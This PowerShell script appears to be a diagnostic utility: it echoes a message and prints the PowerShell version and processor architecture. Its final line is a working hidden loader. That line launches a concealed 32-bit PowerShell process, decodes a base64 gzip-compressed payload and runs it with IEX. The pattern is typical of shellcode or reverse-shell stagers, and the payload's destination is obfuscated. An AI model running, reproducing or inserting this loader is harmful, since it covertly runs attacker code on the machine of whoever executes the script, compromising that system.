











param(
    [string]
    $Message
)

$Message

$PSVersionTable

$env:PROCESSOR_ARCHITECTURE

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAH1wk1gCA7VWbW/aSBD+nEr9D1aFhK0SDIQmTaRKZ2MMJEAAB4NDUbWx12Zh8ZL1mgC9/vcbg93Qa3LX6nQWyPsyMzvzzDM79uPQFYSFEg/G84H09e2bkx7iaCnJuYX9YfNYJ32nIOXW2y+b0u1mQ5STExDJsQcajeO2ZZ1JnyR5oq1WBlsiEk6vrmox5zgUh3mxgYUWRXj5QAmOZEX6UxrNMMentw9z7Arpq5T7UmxQ9oBoKratIXeGpVMt9JK9NnNR4l/RWlEi5Pznz3llclqeFuuPMaKRnLe2kcDLokdpXpG+KcmBd9sVlvMd4nIWMV8URyQ8qxSHYYR83AVra9zBYsa8KK9ALPDjWMQ8lI6iSswchOQ8DHucuZrncRyBTrEVrtkCy7kwprQg/SFPUh8GcSjIEsO+wJytLMzXxMVRsYlCj+IB9qdyFz9lof+qknysBFI9wZUCpOdVZzvMiyk+6OeVn919TqwCzw/JBTy+vX3z9o2fsWLxsLWPSQGjk8l+jMFduccispf7JJUKUgeORILxLUxzdzzGylSaJMmYTKdSLug6BJ0b5wPsFF43U850QCPcza3ZyDRheWIz4k1BLc1YbtdrJcuvE8/APgmxsQ3RkrgZt+SXEoB9ivfRFjOxLvgl59MN7BmY4gCJBMyCNPlZrb4k4ruuHhPqYa65kMQIvIL8Kj86c8iPnG+FHbwEtA7zPCTCB0bjTDpl8TY7PZmDUL5GURQVpF4MJeUWJAsjir2CpIURSbe0WLD9MP/sbiemgrgoEpm5qZLCmB5XY2EkeOxC/iD0O2uFXYJogkRBahIP61uLBNmx+RdxqCFKSRiApTXkAVaS+C2RsIKDh8cMUIoWFq3liuIliO4r3KQogHpO62HPJhRgL/83PzOiH1idAJIhceQlZNmiTBQkm3AB90QCbsam/+TI0WWRuFTjOM2MnJXORN+KhPC5zcdhwtAUpj0oXAAgJmdLHUX4vGoJDnDJ79RbUtPgcVoh7bj6gpS1J1JudeA/JGctZlx4N9fzpsqNzczXWlGr0+wZ/Wazur627Kqw6i1x02uJTn08n1taczB0xH1La96R0sKp7lbXZGe1Nc/ZqOc7ffdU0je7eeD5juH7wYVvDcofTNIe1fp6qYLaRj1uj/QnvVSN6uSp2SfD/uLaFA+OTdHQV4Nx+RKRTZvP7TLr7Fqa1pidubtr327MOt7WaaqXo+pCq2taLazbps5uHJ1rPdVGgc3WkYjUUQCxLu4Ivu8PTb3fN3Vt2Jg/GpdqALpjNNNHdoXcr8aDGcxNcOFGLVVbHt4xpw8gNZiGggHIBLWKO/NBxniv6e+7LKqghc40HWTM+0fwy1mZPQr7d8MK02zaHSOtfb81VbXs9Kpas0RGjUBLTKJA7yMtWhs7Qy3bHvNGH7qOr9pjeqEatbuV66uq+tQ0btz78ubj7cXH9ojYS6YNVdV+l7ACaJHb0MvlUb5fu9Y7iEczRIEHcFNntWgybqY3bo+RREOWD/14gXmIKXQv6G8ZmTVKmZu0gP3lDO3n0BSmUJNDGJ5VXhwp0ndB5bkpZEtXV/fgJpQGsLbYxmEgZoXS5qxUgmu9tKmWIMpfj6zGVls5sVRIusIemdQy3VtWkjrJ8Vk/aGx7oonN/xu4tExn8PL+DbjntX/Y/SUwS4VD6D8t/7jwW9D+fuwjRASIWnDTUHzofC9DkNLk6IPhOEPABj99ko+421icduF74i8Y1HvEPwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

